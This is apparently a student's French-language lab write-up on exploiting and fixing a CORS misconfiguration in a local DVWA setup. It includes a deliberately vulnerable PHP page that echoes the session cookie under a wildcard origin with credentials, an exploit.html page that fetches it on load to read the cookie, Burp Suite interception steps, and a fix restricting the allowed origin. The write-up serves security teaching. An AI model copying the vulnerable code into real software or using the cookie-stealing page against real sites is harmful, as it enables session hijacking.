# Exercice 2: SATTACK

## Configuration du DVWA

1. Avec un script docker-compose.yml, j'ai pu créer l'architechture du DVWA.
2. J'ai configuré le DVWA en mode "low" pour faciliter les tests de sécurité.

<img width="816" height="681" alt="Screenshot from 2025-09-10 16-19-28" src="https://github.com/user-attachments/assets/c9dd9fb4-8b56-4929-8675-161f2b53f4af" />

## Vunérabilité CORS

1. J'ai créé un fichier `cors_vulnerability.php` qui simule une vulnérabilité CORS en autorisant toutes les origines (`*`) et en renvoyant le cookie de session.

```php
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
echo "Votre cookie de session : " . $_COOKIE['PHPSESSID'];
?>
```

- Le header `Access-Control-Allow-Origin: *` permet à n'importe quelle origine d'accéder à la ressource.
- Le header `Access-Control-Allow-Credentials: true` permet d'autoriser l'envoi des cookies avec les requêtes CORS.

- J'ai monté la vulnérabilité dans le conteneur DVWA.

```yml
volumes:
    - ./cors_vulnerability.php:/var/www/html/cors_vulnerability.php
```

### Préparation de la page malveillante

J'ai créé un fichier `exploit.html` qui exploite la vulnérabilité CORS pour voler le cookie de session avec ce script pour le faire: 

```html
<!DOCTYPE html>
<html>
<head>
    <title>Page Malveillante</title>
</head>
<body>
   
    <div id="result"></div>
    
    <script>
        function stealCookie() {
            fetch('http://localhost:8080/cors_vulnerability.php', {
                method: 'GET',
                credentials: 'include'
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('result').innerHTML = 
                    '<h2>cookie vole</h2> <span>' + data + '</span>';
                console.log('Cookie volé:', data);
            })
        }
        window.onload = function() {
            stealCookie();
        };
    </script>
</body>
</html>


```
- Le script utilise la méthode `fetch` pour envoyer une requête GET à `cors_vulnerability.php` avec l'option `credentials: 'include'` pour inclure les cookies.

- Dans cette article, [url](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS), il est dit que , lorsque `Access-Control-Allow-Origin` est défini sur `*`, les navigateurs n'incluent pas les cookies dans les requêtes CORS, même si `credentials: 'include'` est spécifié. Cela signifie que le cookie de session ne sera pas envoyé avec la requête fetch, et par conséquent, le script ne pourra pas voler le cookie de session.

<img width="785" height="141" alt="Screenshot from 2025-09-10 17-37-34" src="https://github.com/user-attachments/assets/609b4530-ed08-4c6c-bd4b-ecb87d29a9a3" />

- Donc pour contourner cette restrition j'utilise l'extension `Allow-CORS` dans le navigateur qui permet de désactiver la politique CORS pour les tests de sécurité.

<img width="667" height="443" alt="Screenshot from 2025-09-10 17-39-26" src="https://github.com/user-attachments/assets/13c4aaef-6fff-493b-a3ee-63e299045199" />

- Je sert cette page malveillante en utilisant un serveur HTTP simple:

```bash
python3 -m http.server 8000
```

- Le cookie volé est affiché dans la page HTML.

<img width="816" height="681" alt="Screenshot from 2025-09-10 16-48-41" src="https://github.com/user-attachments/assets/baeb4db3-68ce-4e81-b11f-992258673d8f" />

### Capturer le traffic avec Burp Suite

- Sur Blurp Suite, j'ai fait une configuration par défaut du proxy pour intercepter les requétes HTTP.
- J'ai ouvert le navigateur à partir de Burp Suite pour capturer le trafic.
- Je me suis loggué dans le DVWA pour générer un cookie de session.
- Puis j'ai visité la page vulnérable `http://localhost:8080/cors_vulnerability.php` pour m'assurer que le cookie est bien renvoyé.

<img width="1222" height="456" alt="Screenshot from 2025-09-10 16-57-59" src="https://github.com/user-attachments/assets/4597088e-929a-4cd7-af7a-ea2483eec160" />

- Ensuite, j'ai visité la page malveillante `http://localhost:8000/exploit.html` pour exécuter le script de vol de cookie.

<img width="650" height="236" alt="Screenshot from 2025-09-10 16-59-46" src="https://github.com/user-attachments/assets/3bae2811-680c-4eaa-9e59-e63e275d40f3" />

- Que je forward dans BlurpSuite pour avoir la réponse.
- J'intercepte encore la réquéte vers `http://localhost:8080/cors_vulnerability.php` qui contient le cookie de session dans la réponse que je forwarde pour avoir le cookie dasn la réponse de la page malveillante.

<img width="711" height="380" alt="Screenshot from 2025-09-10 16-53-28" src="https://github.com/user-attachments/assets/b0f3260f-e357-4738-a96a-27801711305b" />

<img width="1220" height="492" alt="Screenshot from 2025-09-10 17-03-08" src="https://github.com/user-attachments/assets/f5a66b86-c1a9-4dc0-a65c-9578b95f2b97" />

### Contre-mesure

- Pour corriger la vulnérabilité, j'ai modifié le fichier `cors_vulnerability.php` pour restreindre l'origine autorisée à une origine de confiance spécifique au lieu d'utiliser `*`.

```php
header("Access-Control-Allow-Origin: http://localhost:5000");
```

- Pour tester je settup la page de confiance sur le port 5000:

```bash
python3 -m http.server 5000
```

- Et j'obtient bien le cookie.

<img width="667" height="275" alt="Screenshot from 2025-09-10 17-44-39" src="https://github.com/user-attachments/assets/19a0e25e-812f-4d94-8929-b115cae042f6" />

- Je fais le méme test sur la page malveillante sur le port 8000.

<img width="1836" height="307" alt="Screenshot from 2025-09-10 18-53-44" src="https://github.com/user-attachments/assets/10829bd0-e526-4b9b-ae56-af19cf44806f" />

- La requéte pour récupérer le cookie ne marche plus car l'origine n'est pas ```http://localhost:5000```.


### Questions
- Pourquoi « Access-Control-Allow-Origin: * » est-il dangereux ?

parce qu'il permet à n'importe quelle origine d'accéder aux ressources, ce qui peut exposer des données sensibles à des sites malveillants.

- Quel rôle joue « Access-Control-Allow-Credentials: true » ?

Il permet au serveur d'indiquer si la réponse peut contenir des informations liées à l'authentification, comme les cookies.

- Comment un attaquant pourrait-il exploiter cette faille ?

Un attaquant pourrait faire une requéte au serveur vulnérable depuis un site malveillant pour voler des cookies de session ou d'autres informations sensibles.

- Quelles sont les bonnes pratiques pour configurer CORS ?

1. Restreindre les origines autorisées à des domaines spécifiques de confiance.
2. Éviter d'utiliser `*` pour `Access-Control-Allow-Origin` lorsque des cookies ou des informations sensibles sont impliqués.
3. Eviter de mettre `Access-Control-Allow-Credentials: true` si ce n'est pas nécessaire.
4. Eviter d'exposer des cookies ou des informations sensibles via des requêtes CORS.

